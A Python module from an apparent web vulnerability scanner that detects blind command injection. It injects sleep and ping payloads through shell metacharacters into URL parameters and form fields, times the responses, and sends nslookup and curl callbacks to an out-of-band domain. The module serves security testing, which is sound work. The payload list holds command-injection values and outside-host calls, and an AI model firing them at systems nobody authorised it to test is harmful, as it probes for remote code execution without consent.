"""
Blind Command Injection Detector
==================================
Solves Problem 5 (partial): blind/out-of-band vulnerabilities that
produce no error message in the response.

Standard command injection detectors inject payloads like
`; ls -la` and look for directory listings in the response.
That only works when the app's output is reflected back.

Most production apps swallow command output entirely — the app
executes the command, discards its stdout, and returns a generic
"success" or error-page response. These are "blind" injections:
dangerous (RCE), but completely invisible to reflection-based scanners.

This module uses TIME-BASED confirmation — the same proven technique
used by time-based blind SQL injection:
  1. Measure how long the normal request takes (baseline).
  2. Inject a `sleep N` payload into every testable parameter.
  3. If the request takes ~N seconds LONGER than baseline, the sleep
     executed — meaning the parameter is injected into a shell command.

Supported sleep commands cover all major OS/shells:
  Linux/macOS  : sleep N
  Windows CMD  : timeout /t N /nobreak
  Blind ping   : ping -n N 127.0.0.1  (works on both)

OOB confirmation (when Interactsh is configured):
  Injected payloads also include a DNS/curl call to the Interactsh
  callback domain. OOB confirmation upgrades confidence from
  "Likely (timing)" to "Confirmed (OOB callback received)".

Honest limitations
──────────────────
  - Time-based confirmation has inherent false-positive risk on slow
    or rate-limited servers. The code requires the delay to exceed
    baseline + (sleep_seconds - 1.5) to reduce this.
  - Findings are classified as "Likely Vulnerability" (timing-only)
    or "Confirmed" (OOB DNS callback received). Neither is a substitute
    for manual exploitation to confirm real RCE impact.
  - This tests GET/POST parameters only. File-upload paths, JSON body
    parameters, HTTP headers (User-Agent, Referer injection) are not
    tested by this module.
"""

import logging
import time
from typing import Dict, List, Optional
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

import requests

from modules.scan_utils import get_timing_baseline
from modules.interactsh_client import InteractshClient

logger = logging.getLogger(__name__)

SLEEP_DELAY = 7   # seconds — long enough to be unambiguous, short enough not to be painful


def _sleep_payloads(value: str, delay: int = SLEEP_DELAY,
                    oob_domain: Optional[str] = None) -> List[str]:
    """
    Build a set of time-based command injection payloads.
    Each injects a sleep command via common shell metacharacters.
    If an OOB domain is provided, also include DNS-callback payloads
    for out-of-band confirmation.
    """
    payloads = []
    sleep_cmd_linux = f"sleep {delay}"
    sleep_cmd_win   = f"timeout /t {delay} /nobreak"
    ping_cmd        = f"ping -n {delay} 127.0.0.1"

    # Shells: semicolon, pipe, AND, backtick, $()
    injectors = [
        f"; {sleep_cmd_linux}",
        f"| {sleep_cmd_linux}",
        f"& {sleep_cmd_linux}",
        f"`{sleep_cmd_linux}`",
        f"$({sleep_cmd_linux})",
        f"; {sleep_cmd_win}",
        f"& {sleep_cmd_win}",
        f"| {ping_cmd}",
        f"& {ping_cmd}",
        # Newline injection (some apps pass shell args via config files)
        f"\n{sleep_cmd_linux}",
        f"\r\n{sleep_cmd_win}",
    ]

    for inj in injectors:
        payloads.append(f"{value}{inj}")

    # OOB DNS-callback payloads (confirm actual execution, not just delay)
    if oob_domain:
        dns_payloads = [
            f"; nslookup {oob_domain}",
            f"| nslookup {oob_domain}",
            f"& nslookup {oob_domain}",
            f"`nslookup {oob_domain}`",
            f"$(nslookup {oob_domain})",
            f"; curl http://{oob_domain}/",
            f"| curl http://{oob_domain}/",
            f"& curl http://{oob_domain}/",
        ]
        for dp in dns_payloads:
            payloads.append(f"{value}{dp}")

    return payloads


class BlindCommandInjectionDetector:
    """
    Detect blind command injection via timing + optional OOB confirmation.
    """

    def __init__(self, session: requests.Session, config: Dict):
        self.session = session
        self.config  = config
        self._interactsh = InteractshClient(config)
        self._oob_domain: Optional[str] = None

        if self._interactsh.is_available():
            self._oob_domain = self._interactsh.register()
            if self._oob_domain:
                logger.info("Blind CMDi: OOB domain registered: %s", self._oob_domain)

    # ── Public API ─────────────────────────────────────────────────────────

    def test_url(self, url: str) -> List[Dict]:
        """Test all URL query parameters for blind command injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        findings = []
        for param_name, values in params.items():
            original_value = values[0] if values else ""
            finding = self._test_parameter_url(url, param_name, original_value, parsed, params)
            if finding:
                findings.append(finding)

        return findings

    def test_form(self, form: Dict, url: str) -> Optional[Dict]:
        """Test all text/input form fields for blind command injection."""
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        testable = [
            inp for inp in inputs
            if inp.get("type") not in ("submit", "button", "hidden", "file", "checkbox", "radio")
        ]
        if not testable:
            return None

        base_data = {
            inp["name"]: inp.get("value") or "test"
            for inp in inputs
            if inp.get("type") not in ("submit", "button", "file")
        }

        for inp in testable:
            original = inp.get("value") or "test"
            finding = self._test_form_field(action, method, base_data, inp["name"], original)
            if finding:
                return finding

        return None

    # ── Internal ───────────────────────────────────────────────────────────

    def _test_parameter_url(self, url, param_name, original_value, parsed, params) -> Optional[Dict]:
        baseline_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params, doseq=True), parsed.fragment
        ))
        baseline_time = get_timing_baseline(self.session, baseline_url, self.config, samples=2)
        request_timeout = baseline_time + SLEEP_DELAY + 8

        payloads = _sleep_payloads(original_value, SLEEP_DELAY, self._oob_domain)

        for payload in payloads:
            p = params.copy()
            p[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(p, doseq=True), parsed.fragment
            ))

            elapsed, oob_hit = self._timed_request("GET", test_url, None, request_timeout)
            extra = elapsed - baseline_time

            if oob_hit or extra >= (SLEEP_DELAY - 1.5):
                return self._build_finding(
                    url=url, param=param_name, payload=payload,
                    baseline=baseline_time, elapsed=elapsed,
                    oob_hit=oob_hit, method="GET",
                )

        return None

    def _test_form_field(self, action, method, base_data, field_name, original) -> Optional[Dict]:
        try:
            if method == "POST":
                baseline_resp = self.session.post(action, data=base_data,
                                                   timeout=self.config.get("request_timeout", 15))
            else:
                baseline_resp = self.session.get(action, params=base_data,
                                                  timeout=self.config.get("request_timeout", 15))
        except Exception:
            return None

        baseline_time = get_timing_baseline(
            self.session, action, self.config, samples=2
        )
        request_timeout = baseline_time + SLEEP_DELAY + 8

        payloads = _sleep_payloads(original, SLEEP_DELAY, self._oob_domain)

        for payload in payloads:
            data = {**base_data, field_name: payload}
            elapsed, oob_hit = self._timed_request(method, action, data, request_timeout)
            extra = elapsed - baseline_time

            if oob_hit or extra >= (SLEEP_DELAY - 1.5):
                return self._build_finding(
                    url=action, param=field_name, payload=payload,
                    baseline=baseline_time, elapsed=elapsed,
                    oob_hit=oob_hit, method=method,
                )

        return None

    def _timed_request(self, method: str, url_or_action: str,
                       data: Optional[Dict], timeout: float) -> tuple:
        """
        Send the probe request, returning (elapsed_seconds, oob_confirmed).
        oob_confirmed is True only if Interactsh received a callback.
        """
        oob_hit = False
        start = time.time()
        try:
            if method == "POST" and data is not None:
                self.session.post(url_or_action, data=data, timeout=timeout)
            else:
                self.session.get(url_or_action, timeout=timeout)
        except requests.Timeout:
            pass
        except Exception:
            pass
        elapsed = time.time() - start

        # Poll OOB server if we have one (non-blocking, short wait)
        if self._oob_domain and self._interactsh._registered:
            interactions = self._interactsh.poll(wait_seconds=4)
            if interactions:
                oob_hit = True
                logger.info("Blind CMDi: OOB interaction received: %s", interactions[0])

        return elapsed, oob_hit

    def _build_finding(self, url, param, payload, baseline,
                       elapsed, oob_hit, method) -> Dict:
        extra = elapsed - baseline
        if oob_hit:
            confidence   = 92
            classif      = "Confirmed Vulnerability"
            conf_label   = "Confirmed"
            evidence_note = (
                f"OOB callback received confirming server-side command execution. "
                f"Timing: baseline={baseline:.2f}s, with payload={elapsed:.2f}s."
            )
        else:
            confidence   = 65
            classif      = "Likely Vulnerability"
            conf_label   = "Likely"
            evidence_note = (
                f"Timing-based blind detection: baseline={baseline:.2f}s, "
                f"with sleep payload={elapsed:.2f}s (extra={extra:.2f}s, "
                f"expected ≥{SLEEP_DELAY - 1.5:.1f}s). "
                f"No OOB server configured — manual confirmation recommended."
            )

        return {
            "type":                "Command Injection (Blind)",
            "url":                 url,
            "parameter":           param,
            "severity":            "Critical",
            "owasp":               "A03 – Injection",
            "confidence":          confidence,
            "confidence_label":    conf_label,
            "classification":      classif,
            "cvss_estimate":       9.8,
            "evidence_score":      confidence,
            "description": (
                f"The parameter '{param}' appears to be injected into a shell "
                f"command executed server-side. A sleep-based payload caused "
                f"the response to be delayed by ~{extra:.1f} seconds beyond "
                f"the baseline, consistent with server-side command execution."
            ),
            "evidence":            evidence_note,
            "payload":             payload,
            "remediation": (
                "Never pass user input to shell commands. Use language-native "
                "APIs instead (e.g. Python subprocess with a list, not shell=True). "
                "If shell execution is unavoidable, whitelist inputs strictly."
            ),
            "verification_method": (
                "OOB DNS/HTTP callback (Interactsh)" if oob_hit
                else "Time-based blind injection (sleep payload timing)"
            ),
        }
